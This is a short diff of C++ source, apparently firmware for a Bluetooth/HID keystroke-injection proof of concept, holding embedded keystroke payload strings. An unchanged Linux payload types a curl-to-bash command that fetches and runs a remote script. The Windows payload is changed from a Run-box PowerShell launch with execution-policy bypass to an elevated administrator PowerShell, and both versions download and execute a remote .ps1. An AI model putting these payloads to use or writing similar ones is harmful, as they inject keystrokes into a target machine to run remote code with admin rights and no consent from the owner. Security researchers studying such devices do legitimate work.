@@ -104,10 +104,10 @@ DELAY 1500
 STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
 ENTER
 )";
-static const char DEF_WINDOWS[] = R"PAY(# Windows 11: fetch + run the PairTool Just-Works pairing helper (pair_win.ps1).
-GUI r
-DELAY 800
-STRING powershell -NoExit -ExecutionPolicy Bypass -Command "& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1'))) -MAC '{MAC}'"
+static const char DEF_WINDOWS[] = R"PAY(# Windows 11: elevated PowerShell (PairTool needs admin) -> fetch + run pair_win.ps1.
+RunPowershellAdmin
+DELAY 3000
+STRING & ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1'))) -MAC '{MAC}'
 ENTER
 )PAY";
 static const char DEF_MACOS[] = R"(# macOS (placeholder): Spotlight -> Terminal + a note. No real BLE helper yet.
